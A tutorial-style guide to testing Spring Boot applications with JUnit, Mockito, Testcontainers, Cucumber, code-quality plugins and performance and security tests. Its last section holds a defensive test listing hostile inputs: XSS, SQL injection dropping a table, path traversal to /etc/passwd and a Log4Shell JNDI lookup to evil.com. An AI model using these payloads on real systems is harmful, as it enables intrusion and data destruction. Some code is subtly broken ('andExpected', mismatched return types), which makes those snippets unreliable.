# Testing & Code Quality

## Table of Contents

1. [Unit Testing](#unit-testing)
2. [Integration Testing](#integration-testing)
3. [Test Containers](#test-containers)
4. [Behavior-Driven Development (BDD)](#behavior-driven-development-bdd)
5. [Testing Best Practices](#testing-best-practices)
6. [Code Quality Tools](#code-quality-tools)
7. [Performance Testing](#performance-testing)
8. [Security Testing](#security-testing)

---

## Unit Testing

### JUnit 5 Fundamentals

```java
@ExtendWith(MockitoExtension.class)
class UserServiceTest {

    @Mock
    private UserRepository userRepository;

    @Mock
    private PasswordEncoder passwordEncoder;

    @InjectMocks
    private UserService userService;

    @Test
    @DisplayName("Should create user successfully when valid data provided")
    void shouldCreateUserSuccessfully() {
        // Given
        CreateUserRequest request = new CreateUserRequest("john", "john@example.com", "password123");
        User savedUser = new User(1L, "john", "john@example.com", "encoded_password");

        when(userRepository.existsByEmail(request.getEmail())).thenReturn(false);
        when(passwordEncoder.encode(request.getPassword())).thenReturn("encoded_password");
        when(userRepository.save(any(User.class))).thenReturn(savedUser);

        // When
        UserResponse result = userService.createUser(request);

        // Then
        assertThat(result.getId()).isEqualTo(1L);
        assertThat(result.getUsername()).isEqualTo("john");
        assertThat(result.getEmail()).isEqualTo("john@example.com");

        verify(userRepository).existsByEmail(request.getEmail());
        verify(passwordEncoder).encode(request.getPassword());
        verify(userRepository).save(argThat(user ->
            user.getUsername().equals("john") &&
            user.getEmail().equals("john@example.com")
        ));
    }

    @Test
    @DisplayName("Should throw exception when email already exists")
    void shouldThrowExceptionWhenEmailAlreadyExists() {
        // Given
        CreateUserRequest request = new CreateUserRequest("john", "john@example.com", "password123");
        when(userRepository.existsByEmail(request.getEmail())).thenReturn(true);

        // When & Then
        assertThatThrownBy(() -> userService.createUser(request))
            .isInstanceOf(DuplicateEmailException.class)
            .hasMessage("Email already exists: john@example.com");

        verify(userRepository).existsByEmail(request.getEmail());
        verifyNoMoreInteractions(userRepository, passwordEncoder);
    }

    @ParameterizedTest
    @ValueSource(strings = {"", " ", "invalid-email", "@example.com"})
    @DisplayName("Should throw exception for invalid email formats")
    void shouldThrowExceptionForInvalidEmails(String invalidEmail) {
        // Given
        CreateUserRequest request = new CreateUserRequest("john", invalidEmail, "password123");

        // When & Then
        assertThatThrownBy(() -> userService.createUser(request))
            .isInstanceOf(ValidationException.class);
    }

    @Test
    @Timeout(value = 2, unit = TimeUnit.SECONDS)
    @DisplayName("Should complete user creation within 2 seconds")
    void shouldCompleteUserCreationWithinTimeLimit() {
        // Test performance requirement
        CreateUserRequest request = new CreateUserRequest("john", "john@example.com", "password123");
        when(userRepository.existsByEmail(any())).thenReturn(false);
        when(passwordEncoder.encode(any())).thenReturn("encoded");
        when(userRepository.save(any())).thenReturn(new User());

        assertDoesNotThrow(() -> userService.createUser(request));
    }
}
```

### Advanced Mockito Features

```java
@ExtendWith(MockitoExtension.class)
class OrderServiceTest {

    @Mock
    private OrderRepository orderRepository;

    @Mock
    private UserServiceClient userServiceClient;

    @Mock
    private NotificationService notificationService;

    @InjectMocks
    private OrderService orderService;

    @Test
    void shouldProcessOrderWithCallbacks() {
        // Given
        CreateOrderRequest request = new CreateOrderRequest(1L, Arrays.asList(
            new OrderItem("product1", 2, new BigDecimal("10.00"))
        ));

        // Mock with Answer
        when(userServiceClient.getUserById(1L)).thenAnswer(invocation -> {
            Long userId = invocation.getArgument(0);
            return new User(userId, "user" + userId, "user" + userId + "@example.com");
        });

        // Mock void method with doAnswer
        doAnswer(invocation -> {
            String email = invocation.getArgument(0);
            String subject = invocation.getArgument(1);
            System.out.println("Sending email to: " + email + " with subject: " + subject);
            return null;
        }).when(notificationService).sendEmail(anyString(), anyString(), anyString());

        // When
        Order result = orderService.createOrder(request);

        // Then
        verify(notificationService).sendEmail(
            eq("user1@example.com"),
            eq("Order Confirmation"),
            contains("Order ID")
        );
    }

    @Test
    void shouldHandleExternalServiceFailure() {
        // Given
        CreateOrderRequest request = new CreateOrderRequest(1L, Collections.emptyList());

        when(userServiceClient.getUserById(1L))
            .thenThrow(new ServiceUnavailableException("User service down"));

        // When & Then
        assertThatThrownBy(() -> orderService.createOrder(request))
            .isInstanceOf(OrderCreationException.class)
            .hasCauseInstanceOf(ServiceUnavailableException.class);
    }

    @Test
    void shouldVerifyInteractionOrder() {
        // Given
        CreateOrderRequest request = new CreateOrderRequest(1L, Collections.emptyList());
        when(userServiceClient.getUserById(1L)).thenReturn(new User());
        when(orderRepository.save(any())).thenReturn(new Order());

        // When
        orderService.createOrder(request);

        // Then - verify order of interactions
        InOrder inOrder = inOrder(userServiceClient, orderRepository, notificationService);
        inOrder.verify(userServiceClient).getUserById(1L);
        inOrder.verify(orderRepository).save(any(Order.class));
        inOrder.verify(notificationService).sendEmail(anyString(), anyString(), anyString());
    }
}
```

### Testing Exceptions and Edge Cases

```java
class UserValidationServiceTest {

    @Test
    void shouldValidatePasswordComplexity() {
        UserValidationService validator = new UserValidationService();

        // Test weak passwords
        assertAll("Weak passwords should be rejected",
            () -> assertThatThrownBy(() -> validator.validatePassword("123"))
                .isInstanceOf(WeakPasswordException.class),
            () -> assertThatThrownBy(() -> validator.validatePassword("password"))
                .isInstanceOf(WeakPasswordException.class),
            () -> assertThatThrownBy(() -> validator.validatePassword("PASSWORD"))
                .isInstanceOf(WeakPasswordException.class)
        );

        // Test strong password
        assertDoesNotThrow(() -> validator.validatePassword("StrongP@ssw0rd"));
    }

    @Test
    void shouldHandleNullAndEmptyInputs() {
        UserValidationService validator = new UserValidationService();

        assertAll("Null and empty inputs",
            () -> assertThatThrownBy(() -> validator.validateEmail(null))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessage("Email cannot be null"),
            () -> assertThatThrownBy(() -> validator.validateEmail(""))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessage("Email cannot be empty"),
            () -> assertThatThrownBy(() -> validator.validateEmail("   "))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessage("Email cannot be blank")
        );
    }
}
```

---

## Integration Testing

### Spring Boot Test Annotations

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@AutoConfigureTestDatabase(replace = AutoConfigureTestDatabase.Replace.NONE)
@TestPropertySource(properties = {
    "spring.datasource.url=jdbc:h2:mem:testdb",
    "spring.jpa.hibernate.ddl-auto=create-drop"
})
class UserControllerIntegrationTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Autowired
    private UserRepository userRepository;

    @BeforeEach
    void setUp() {
        userRepository.deleteAll();
    }

    @Test
    void shouldCreateUserSuccessfully() {
        // Given
        CreateUserRequest request = new CreateUserRequest(
            "john", "john@example.com", "password123");

        // When
        ResponseEntity<UserResponse> response = restTemplate.postForEntity(
            "/api/users", request, UserResponse.class);

        // Then
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        assertThat(response.getBody().getUsername()).isEqualTo("john");
        assertThat(response.getBody().getEmail()).isEqualTo("john@example.com");

        // Verify database state
        Optional<User> savedUser = userRepository.findByEmail("john@example.com");
        assertThat(savedUser).isPresent();
        assertThat(savedUser.get().getUsername()).isEqualTo("john");
    }

    @Test
    void shouldReturnBadRequestForDuplicateEmail() {
        // Given - existing user
        User existingUser = new User("jane", "john@example.com", "encoded");
        userRepository.save(existingUser);

        CreateUserRequest request = new CreateUserRequest(
            "john", "john@example.com", "password123");

        // When
        ResponseEntity<ErrorResponse> response = restTemplate.postForEntity(
            "/api/users", request, ErrorResponse.class);

        // Then
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        assertThat(response.getBody().getMessage()).contains("Email already exists");
    }
}
```

### Repository Layer Testing

```java
@DataJpaTest
class UserRepositoryTest {

    @Autowired
    private TestEntityManager entityManager;

    @Autowired
    private UserRepository userRepository;

    @Test
    void shouldFindUserByEmail() {
        // Given
        User user = new User("john", "john@example.com", "password");
        entityManager.persistAndFlush(user);

        // When
        Optional<User> found = userRepository.findByEmail("john@example.com");

        // Then
        assertThat(found).isPresent();
        assertThat(found.get().getUsername()).isEqualTo("john");
    }

    @Test
    void shouldReturnEmptyWhenUserNotFound() {
        // When
        Optional<User> found = userRepository.findByEmail("nonexistent@example.com");

        // Then
        assertThat(found).isEmpty();
    }

    @Test
    void shouldFindActiveUsers() {
        // Given
        User activeUser = new User("active", "active@example.com", "password");
        activeUser.setActive(true);

        User inactiveUser = new User("inactive", "inactive@example.com", "password");
        inactiveUser.setActive(false);

        entityManager.persist(activeUser);
        entityManager.persist(inactiveUser);
        entityManager.flush();

        // When
        List<User> activeUsers = userRepository.findByActive(true);

        // Then
        assertThat(activeUsers).hasSize(1);
        assertThat(activeUsers.get(0).getUsername()).isEqualTo("active");
    }

    @Test
    void shouldCountUsersByStatus() {
        // Given
        createUsers(5, true);
        createUsers(3, false);

        // When
        long activeCount = userRepository.countByActive(true);
        long inactiveCount = userRepository.countByActive(false);

        // Then
        assertThat(activeCount).isEqualTo(5);
        assertThat(inactiveCount).isEqualTo(3);
    }

    private void createUsers(int count, boolean active) {
        for (int i = 0; i < count; i++) {
            User user = new User("user" + i, "user" + i + "@example.com", "password");
            user.setActive(active);
            entityManager.persist(user);
        }
        entityManager.flush();
    }
}
```

### Web Layer Testing

```java
@WebMvcTest(UserController.class)
class UserControllerTest {

    @Autowired
    private MockMvc mockMvc;

    @MockBean
    private UserService userService;

    @Autowired
    private ObjectMapper objectMapper;

    @Test
    void shouldCreateUser() throws Exception {
        // Given
        CreateUserRequest request = new CreateUserRequest("john", "john@example.com", "password");
        UserResponse response = new UserResponse(1L, "john", "john@example.com", LocalDateTime.now());

        when(userService.createUser(any(CreateUserRequest.class))).thenReturn(response);

        // When & Then
        mockMvc.perform(post("/api/users")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(request)))
                .andExpect(status().isCreated())
                .andExpect(jsonPath("$.id").value(1))
                .andExpect(jsonPath("$.username").value("john"))
                .andExpect(jsonPath("$.email").value("john@example.com"));

        verify(userService).createUser(argThat(req ->
            req.getUsername().equals("john") &&
            req.getEmail().equals("john@example.com")
        ));
    }

    @Test
    void shouldReturnValidationErrorForInvalidRequest() throws Exception {
        // Given
        CreateUserRequest invalidRequest = new CreateUserRequest("", "invalid-email", "");

        // When & Then
        mockMvc.perform(post("/api/users")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(invalidRequest)))
                .andExpected(status().isBadRequest())
                .andExpect(jsonPath("$.fieldErrors.username").exists())
                .andExpected(jsonPath("$.fieldErrors.email").exists())
                .andExpected(jsonPath("$.fieldErrors.password").exists());
    }

    @Test
    @WithMockUser(roles = "ADMIN")
    void shouldReturnAllUsersForAdmin() throws Exception {
        // Given
        List<UserResponse> users = Arrays.asList(
            new UserResponse(1L, "user1", "user1@example.com", LocalDateTime.now()),
            new UserResponse(2L, "user2", "user2@example.com", LocalDateTime.now())
        );

        when(userService.getAllUsers()).thenReturn(users);

        // When & Then
        mockMvc.perform(get("/api/users"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$", hasSize(2)))
                .andExpected(jsonPath("$[0].username").value("user1"))
                .andExpected(jsonPath("$[1].username").value("user2"));
    }

    @Test
    void shouldReturnUnauthorizedForProtectedEndpoint() throws Exception {
        mockMvc.perform(get("/api/users"))
                .andExpect(status().isUnauthorized());
    }
}
```

---

## Test Containers

### Database Testing with TestContainers

```xml
<dependency>
    <groupId>org.testcontainers</groupId>
    <artifactId>junit-jupiter</artifactId>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>org.testcontainers</groupId>
    <artifactId>mysql</artifactId>
    <scope>test</scope>
</dependency>
```

```java
@SpringBootTest
@Testcontainers
@TestMethodOrder(OrderAnnotation.class)
class UserServiceIntegrationTest {

    @Container
    static MySQLContainer<?> mysql = new MySQLContainer<>("mysql:8.0")
            .withDatabaseName("testdb")
            .withUsername("test")
            .withPassword("test");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.datasource.url", mysql::getJdbcUrl);
        registry.add("spring.datasource.username", mysql::getUsername);
        registry.add("spring.datasource.password", mysql::getPassword);
    }

    @Autowired
    private UserService userService;

    @Autowired
    private UserRepository userRepository;

    @Test
    @Order(1)
    void shouldCreateUserInDatabase() {
        // Given
        CreateUserRequest request = new CreateUserRequest("john", "john@example.com", "password");

        // When
        UserResponse response = userService.createUser(request);

        // Then
        assertThat(response.getId()).isNotNull();

        Optional<User> savedUser = userRepository.findById(response.getId());
        assertThat(savedUser).isPresent();
        assertThat(savedUser.get().getUsername()).isEqualTo("john");
    }

    @Test
    @Order(2)
    void shouldFindExistingUser() {
        // When
        Optional<User> user = userRepository.findByEmail("john@example.com");

        // Then
        assertThat(user).isPresent();
        assertThat(user.get().getUsername()).isEqualTo("john");
    }
}
```

### Redis Testing with TestContainers

```java
@SpringBootTest
@Testcontainers
class CacheServiceIntegrationTest {

    @Container
    static GenericContainer<?> redis = new GenericContainer<>("redis:6.2-alpine")
            .withExposedPorts(6379);

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.redis.host", redis::getHost);
        registry.add("spring.redis.port", redis::getFirstMappedPort);
    }

    @Autowired
    private CacheService cacheService;

    @Autowired
    private RedisTemplate<String, Object> redisTemplate;

    @Test
    void shouldCacheAndRetrieveData() {
        // Given
        String key = "test-key";
        String value = "test-value";

        // When
        cacheService.put(key, value);
        Object retrieved = cacheService.get(key);

        // Then
        assertThat(retrieved).isEqualTo(value);
        assertThat(redisTemplate.hasKey(key)).isTrue();
    }
}
```

### Message Queue Testing

```java
@SpringBootTest
@Testcontainers
class MessageProcessingIntegrationTest {

    @Container
    static RabbitMQContainer rabbitmq = new RabbitMQContainer("rabbitmq:3.8-management-alpine");

    @DynamicPropertySource
    static void configureProperties(DynamicPropertyRegistry registry) {
        registry.add("spring.rabbitmq.host", rabbitmq::getHost);
        registry.add("spring.rabbitmq.port", rabbitmq::getAmqpPort);
        registry.add("spring.rabbitmq.username", rabbitmq::getAdminUsername);
        registry.add("spring.rabbitmq.password", rabbitmq::getAdminPassword);
    }

    @Autowired
    private OrderEventPublisher eventPublisher;

    @Autowired
    private OrderEventListener eventListener;

    @Test
    void shouldProcessOrderEventThroughQueue() throws InterruptedException {
        // Given
        OrderCreatedEvent event = new OrderCreatedEvent(1L, 100L, new BigDecimal("99.99"));

        // When
        eventPublisher.publishOrderCreated(event);

        // Then - wait for async processing
        Thread.sleep(1000);

        // Verify event was processed
        verify(eventListener, timeout(2000)).handleOrderCreated(argThat(e ->
            e.getOrderId().equals(1L) &&
            e.getAmount().equals(new BigDecimal("99.99"))
        ));
    }
}
```

---

## Behavior-Driven Development (BDD)

### Cucumber Setup

```xml
<dependency>
    <groupId>io.cucumber</groupId>
    <artifactId>cucumber-java</artifactId>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>io.cucumber</groupId>
    <artifactId>cucumber-spring</artifactId>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>io.cucumber</groupId>
    <artifactId>cucumber-junit-platform-engine</artifactId>
    <scope>test</scope>
</dependency>
```

### Feature Files

```gherkin
# src/test/resources/features/user-management.feature
Feature: User Management
  As a system administrator
  I want to manage users
  So that I can control access to the system

  Background:
    Given the user management system is running

  Scenario: Create a new user successfully
    Given I have valid user details
      | username | email           | password    |
      | john     | john@example.com| password123 |
    When I create a new user
    Then the user should be created successfully
    And the user should be assigned a unique ID
    And the user should be active by default

  Scenario: Prevent duplicate email registration
    Given a user already exists with email "john@example.com"
    When I try to create a user with the same email
    Then the creation should fail
    And I should receive an error message "Email already exists"

  Scenario Outline: Validate password complexity
    Given I have user details with password "<password>"
    When I create a new user
    Then the creation should "<result>"

    Examples:
      | password    | result |
      | 123         | fail   |
      | password    | fail   |
      | Password123!| succeed|

  Scenario: Deactivate a user
    Given an active user exists with ID 1
    When I deactivate the user
    Then the user should be marked as inactive
    And the user should not be able to login
```

### Step Definitions

```java
@CucumberContextConfiguration
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
public class CucumberSpringConfiguration {
}

public class UserManagementSteps {

    @Autowired
    private TestRestTemplate restTemplate;

    @Autowired
    private UserRepository userRepository;

    private CreateUserRequest userRequest;
    private ResponseEntity<?> lastResponse;
    private User existingUser;

    @Given("the user management system is running")
    public void theUserManagementSystemIsRunning() {
        // System is already running due to @SpringBootTest
        userRepository.deleteAll();
    }

    @Given("I have valid user details")
    public void iHaveValidUserDetails(DataTable dataTable) {
        List<Map<String, String>> userData = dataTable.asMaps();
        Map<String, String> user = userData.get(0);

        userRequest = new CreateUserRequest(
            user.get("username"),
            user.get("email"),
            user.get("password")
        );
    }

    @Given("a user already exists with email {string}")
    public void aUserAlreadyExistsWithEmail(String email) {
        existingUser = new User("existing", email, "encoded_password");
        userRepository.save(existingUser);
    }

    @Given("I have user details with password {string}")
    public void iHaveUserDetailsWithPassword(String password) {
        userRequest = new CreateUserRequest("testuser", "test@example.com", password);
    }

    @Given("an active user exists with ID {int}")
    public void anActiveUserExistsWithID(int userId) {
        existingUser = new User("activeuser", "active@example.com", "password");
        existingUser.setActive(true);
        existingUser = userRepository.save(existingUser);
    }

    @When("I create a new user")
    public void iCreateANewUser() {
        lastResponse = restTemplate.postForEntity("/api/users", userRequest, UserResponse.class);
    }

    @When("I try to create a user with the same email")
    public void iTryToCreateAUserWithTheSameEmail() {
        userRequest = new CreateUserRequest("newuser", existingUser.getEmail(), "password123");
        lastResponse = restTemplate.postForEntity("/api/users", userRequest, ErrorResponse.class);
    }

    @When("I deactivate the user")
    public void iDeactivateTheUser() {
        lastResponse = restTemplate.exchange(
            "/api/users/" + existingUser.getId() + "/deactivate",
            HttpMethod.PUT,
            null,
            Void.class
        );
    }

    @Then("the user should be created successfully")
    public void theUserShouldBeCreatedSuccessfully() {
        assertThat(lastResponse.getStatusCode()).isEqualTo(HttpStatus.CREATED);
    }

    @Then("the user should be assigned a unique ID")
    public void theUserShouldBeAssignedAUniqueID() {
        UserResponse user = (UserResponse) lastResponse.getBody();
        assertThat(user.getId()).isNotNull();
        assertThat(user.getId()).isGreaterThan(0);
    }

    @Then("the user should be active by default")
    public void theUserShouldBeActiveByDefault() {
        UserResponse user = (UserResponse) lastResponse.getBody();
        Optional<User> savedUser = userRepository.findById(user.getId());
        assertThat(savedUser).isPresent();
        assertThat(savedUser.get().isActive()).isTrue();
    }

    @Then("the creation should fail")
    public void theCreationShouldFail() {
        assertThat(lastResponse.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
    }

    @Then("I should receive an error message {string}")
    public void iShouldReceiveAnErrorMessage(String expectedMessage) {
        ErrorResponse error = (ErrorResponse) lastResponse.getBody();
        assertThat(error.getMessage()).contains(expectedMessage);
    }

    @Then("the creation should {string}")
    public void theCreationShould(String result) {
        if ("succeed".equals(result)) {
            assertThat(lastResponse.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        } else {
            assertThat(lastResponse.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        }
    }

    @Then("the user should be marked as inactive")
    public void theUserShouldBeMarkedAsInactive() {
        User user = userRepository.findById(existingUser.getId()).orElseThrow();
        assertThat(user.isActive()).isFalse();
    }

    @Then("the user should not be able to login")
    public void theUserShouldNotBeAbleToLogin() {
        // This would typically involve testing the authentication system
        // For now, we verify the user is inactive
        assertThat(lastResponse.getStatusCode()).isEqualTo(HttpStatus.OK);
    }
}
```

### Test Runner

```java
@Suite
@IncludeEngines("cucumber")
@SelectClasspathResource("features")
@ConfigurationParameter(key = PLUGIN_PROPERTY_NAME, value = "pretty")
public class CucumberTestRunner {
}
```

---

## Testing Best Practices

### Test Structure and Organization

```java
class OrderServiceTest {

    // Test class structure follows AAA pattern
    @Nested
    @DisplayName("Order Creation")
    class OrderCreation {

        @Test
        @DisplayName("Should create order when all validations pass")
        void shouldCreateOrderWhenValidationsPass() {
            // Arrange (Given)
            CreateOrderRequest validRequest = createValidOrderRequest();
            when(userService.exists(validRequest.getUserId())).thenReturn(true);
            when(inventoryService.isAvailable(validRequest.getItems())).thenReturn(true);

            // Act (When)
            Order result = orderService.createOrder(validRequest);

            // Assert (Then)
            assertThat(result).isNotNull();
            assertThat(result.getStatus()).isEqualTo(OrderStatus.PENDING);
            assertThat(result.getItems()).hasSize(validRequest.getItems().size());
        }
    }

    @Nested
    @DisplayName("Order Validation")
    class OrderValidation {

        @Test
        @DisplayName("Should reject order when user does not exist")
        void shouldRejectOrderWhenUserNotExists() {
            // Arrange
            CreateOrderRequest request = createValidOrderRequest();
            when(userService.exists(request.getUserId())).thenReturn(false);

            // Act & Assert
            assertThatThrownBy(() -> orderService.createOrder(request))
                .isInstanceOf(UserNotFoundException.class)
                .hasMessage("User not found: " + request.getUserId());
        }
    }

    private CreateOrderRequest createValidOrderRequest() {
        return CreateOrderRequest.builder()
            .userId(1L)
            .items(Arrays.asList(
                OrderItem.builder()
                    .productId("product1")
                    .quantity(2)
                    .price(new BigDecimal("10.00"))
                    .build()
            ))
            .build();
    }
}
```

### Test Data Builders

```java
public class UserTestDataBuilder {

    private Long id = 1L;
    private String username = "testuser";
    private String email = "test@example.com";
    private String password = "password123";
    private boolean active = true;
    private LocalDateTime createdAt = LocalDateTime.now();

    public static UserTestDataBuilder aUser() {
        return new UserTestDataBuilder();
    }

    public UserTestDataBuilder withId(Long id) {
        this.id = id;
        return this;
    }

    public UserTestDataBuilder withUsername(String username) {
        this.username = username;
        return this;
    }

    public UserTestDataBuilder withEmail(String email) {
        this.email = email;
        return this;
    }

    public UserTestDataBuilder inactive() {
        this.active = false;
        return this;
    }

    public UserTestDataBuilder createdAt(LocalDateTime createdAt) {
        this.createdAt = createdAt;
        return this;
    }

    public User build() {
        User user = new User();
        user.setId(id);
        user.setUsername(username);
        user.setEmail(email);
        user.setPassword(password);
        user.setActive(active);
        user.setCreatedAt(createdAt);
        return user;
    }

    public CreateUserRequest buildRequest() {
        return new CreateUserRequest(username, email, password);
    }
}

// Usage in tests
@Test
void shouldCreateInactiveUser() {
    User user = aUser()
        .withUsername("inactive_user")
        .withEmail("inactive@example.com")
        .inactive()
        .build();

    assertThat(user.isActive()).isFalse();
}
```

### Custom Test Annotations

```java
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
@Test
@Transactional
@Rollback
public @interface DatabaseTest {
}

@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
@Test
@WithMockUser(roles = "ADMIN")
public @interface AdminTest {
}

// Usage
class UserServiceTest {

    @DatabaseTest
    void shouldPersistUserToDatabase() {
        // Test database operations
    }

    @AdminTest
    void shouldAllowAdminOperations() {
        // Test admin-only operations
    }
}
```

---

## Code Quality Tools

### SonarQube Integration

```xml
<properties>
    <sonar.host.url>http://localhost:9000</sonar.host.url>
    <sonar.projectKey>my-spring-boot-app</sonar.projectKey>
    <sonar.exclusions>**/generated/**,**/dto/**</sonar.exclusions>
    <sonar.coverage.exclusions>**/config/**,**/Application.java</sonar.coverage.exclusions>
</properties>

<plugin>
    <groupId>org.sonarsource.scanner.maven</groupId>
    <artifactId>sonar-maven-plugin</artifactId>
    <version>3.9.1.2184</version>
</plugin>

<plugin>
    <groupId>org.jacoco</groupId>
    <artifactId>jacoco-maven-plugin</artifactId>
    <version>0.8.8</version>
    <executions>
        <execution>
            <goals>
                <goal>prepare-agent</goal>
            </goals>
        </execution>
        <execution>
            <id>report</id>
            <phase>test</phase>
            <goals>
                <goal>report</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### CheckStyle Configuration

```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-checkstyle-plugin</artifactId>
    <version>3.1.2</version>
    <configuration>
        <configLocation>checkstyle.xml</configLocation>
        <encoding>UTF-8</encoding>
        <consoleOutput>true</consoleOutput>
        <failsOnError>true</failsOnError>
    </configuration>
    <executions>
        <execution>
            <id>validate</id>
            <phase>validate</phase>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### SpotBugs Integration

```xml
<plugin>
    <groupId>com.github.spotbugs</groupId>
    <artifactId>spotbugs-maven-plugin</artifactId>
    <version>4.5.3.0</version>
    <configuration>
        <effort>Max</effort>
        <threshold>Low</threshold>
        <xmlOutput>true</xmlOutput>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### Custom Quality Gates

```java
@Test
void shouldMaintainCodeCoverage() {
    // This test fails if coverage drops below threshold
    double currentCoverage = getCoverageFromJacocoReport();
    double minimumCoverage = 80.0;

    assertThat(currentCoverage)
        .withFailMessage("Code coverage is %.2f%%, below minimum of %.2f%%",
                        currentCoverage, minimumCoverage)
        .isGreaterThanOrEqualTo(minimumCoverage);
}

@Test
void shouldNotHaveHighComplexityMethods() {
    // This could be implemented to check cyclomatic complexity
    List<Method> highComplexityMethods = findMethodsWithHighComplexity();

    assertThat(highComplexityMethods)
        .withFailMessage("Found methods with high complexity: %s",
                        highComplexityMethods.stream()
                            .map(Method::getName)
                            .collect(Collectors.toList()))
        .isEmpty();
}
```

---

## Performance Testing

### JMH Benchmarking

```xml
<dependency>
    <groupId>org.openjdk.jmh</groupId>
    <artifactId>jmh-core</artifactId>
    <scope>test</scope>
</dependency>
<dependency>
    <groupId>org.openjdk.jmh</groupId>
    <artifactId>jmh-generator-annprocess</artifactId>
    <scope>test</scope>
</dependency>
```

```java
@BenchmarkMode(Mode.AverageTime)
@OutputTimeUnit(TimeUnit.MICROSECONDS)
@State(Scope.Benchmark)
public class UserServiceBenchmark {

    private UserService userService;
    private List<CreateUserRequest> userRequests;

    @Setup
    public void setup() {
        userService = new UserService(mock(UserRepository.class), new BCryptPasswordEncoder());
        userRequests = generateUserRequests(1000);
    }

    @Benchmark
    public void benchmarkUserCreation(Blackhole bh) {
        for (CreateUserRequest request : userRequests) {
            User user = userService.createUser(request);
            bh.consume(user);
        }
    }

    @Benchmark
    @Fork(value = 1, warmups = 1)
    @Warmup(iterations = 2, time = 1, timeUnit = TimeUnit.SECONDS)
    @Measurement(iterations = 3, time = 2, timeUnit = TimeUnit.SECONDS)
    public void benchmarkPasswordHashing() {
        BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
        String password = "password123";
        String hashed = encoder.encode(password);
        // Consume the result to prevent JVM optimizations
        Blackhole.consumeCPU(1);
    }
}
```

### Load Testing with Spring Boot

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class LoadTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Test
    @Timeout(30)
    void shouldHandleConcurrentUserCreation() throws InterruptedException {
        int numberOfThreads = 50;
        int requestsPerThread = 10;
        CountDownLatch latch = new CountDownLatch(numberOfThreads);
        AtomicInteger successCount = new AtomicInteger(0);
        AtomicInteger errorCount = new AtomicInteger(0);

        ExecutorService executor = Executors.newFixedThreadPool(numberOfThreads);

        for (int i = 0; i < numberOfThreads; i++) {
            final int threadId = i;
            executor.submit(() -> {
                try {
                    for (int j = 0; j < requestsPerThread; j++) {
                        CreateUserRequest request = new CreateUserRequest(
                            "user" + threadId + "_" + j,
                            "user" + threadId + "_" + j + "@example.com",
                            "password123"
                        );

                        ResponseEntity<UserResponse> response = restTemplate.postForEntity(
                            "/api/users", request, UserResponse.class);

                        if (response.getStatusCode().is2xxSuccessful()) {
                            successCount.incrementAndGet();
                        } else {
                            errorCount.incrementAndGet();
                        }
                    }
                } finally {
                    latch.countDown();
                }
            });
        }

        latch.await();
        executor.shutdown();

        int totalRequests = numberOfThreads * requestsPerThread;
        assertThat(successCount.get()).isGreaterThan(totalRequests * 0.95); // 95% success rate
        assertThat(errorCount.get()).isLessThan(totalRequests * 0.05); // Less than 5% errors
    }
}
```

---

## Security Testing

### Authentication Testing

```java
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class SecurityTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Test
    void shouldDenyAccessToProtectedEndpointWithoutToken() {
        ResponseEntity<String> response = restTemplate.getForEntity("/api/users", String.class);
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
    }

    @Test
    void shouldAllowAccessWithValidToken() {
        String token = getValidJwtToken();

        HttpHeaders headers = new HttpHeaders();
        headers.setBearerAuth(token);
        HttpEntity<String> entity = new HttpEntity<>(headers);

        ResponseEntity<String> response = restTemplate.exchange(
            "/api/users", HttpMethod.GET, entity, String.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
    }

    @Test
    void shouldRejectExpiredToken() {
        String expiredToken = getExpiredJwtToken();

        HttpHeaders headers = new HttpHeaders();
        headers.setBearerAuth(expiredToken);
        HttpEntity<String> entity = new HttpEntity<>(headers);

        ResponseEntity<String> response = restTemplate.exchange(
            "/api/users", HttpMethod.GET, entity, String.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
    }
}
```

### Input Validation Testing

```java
@ParameterizedTest
@ValueSource(strings = {
    "<script>alert('xss')</script>",
    "'; DROP TABLE users; --",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/a}"
})
void shouldRejectMaliciousInput(String maliciousInput) {
    CreateUserRequest request = new CreateUserRequest(maliciousInput, "test@example.com", "password");

    ResponseEntity<ErrorResponse> response = restTemplate.postForEntity(
        "/api/users", request, ErrorResponse.class);

    assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
}
```

This comprehensive guide covers all essential testing and code quality concepts for building robust Spring Boot applications at the SDE2 level.
